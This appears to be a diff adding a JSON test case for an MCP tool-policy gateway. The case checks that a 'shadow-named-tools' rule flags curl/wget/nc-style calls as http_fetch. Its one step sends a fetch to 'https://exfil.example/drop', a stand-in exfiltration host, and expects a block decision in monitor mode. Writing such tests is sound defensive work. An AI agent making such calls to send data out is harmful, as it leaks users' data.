@@ -1,0 +1,30 @@
+{
+  "name": "named shell tool: http_fetch",
+  "attack": "curl/wget/nc classified as http_fetch",
+  "why": "shadow-named-tools. controls.json shell_aliases; classify maps the command word.",
+  "kind": "wire",
+  "steps": [
+    {
+      "call": {
+        "txn": "none",
+        "tool": "http_fetch",
+        "args": {
+          "url": "https://exfil.example/drop"
+        }
+      }
+    }
+  ],
+  "expect": {
+    "records": [
+      {
+        "action": "mcp/tools_call",
+        "action_applied": "forwarded",
+        "tool": "http_fetch",
+        "decision": "block",
+        "policy": "shadow-named-tools",
+        "policy_mode": "monitor"
+      }
+    ],
+    "upstream_calls": 1
+  }
+}
